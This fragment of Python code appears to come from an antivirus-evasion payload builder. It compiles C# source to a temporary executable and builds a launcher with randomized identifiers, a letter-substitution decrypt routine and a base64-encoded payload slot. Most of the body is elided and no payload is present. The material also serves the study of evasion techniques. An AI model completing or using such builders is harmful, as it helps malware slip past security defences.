...
def arya(source):
    ...
    tempExePath = bypass_helpers.compileToTemp("cs", source)
...
def buildAryaLauncher(raw):
    ...
    decodeFuncName = bypass_helpers.randomString()
    baseStringName = bypass_helpers.randomString()
    targetStringName = bypass_helpers.randomString()
    dictionaryName = bypass_helpers.randomString()

    # build out the letter sub decrypt function
    payload_code += "namespace %s { class %s { private static string %s(string t, string k) {\n" % (bypass_helpers.randomString(), bypass_helpers.randomString(), decodeFuncName)
    ...
    base64PayloadName = bypass_helpers.randomString()
    assemblyName = bypass_helpers.randomString()

    # build out Main()
    assemblyName = bypass_helpers.randomString()
    methodInfoName = bypass_helpers.randomString()
    keyName = bypass_helpers.randomString()
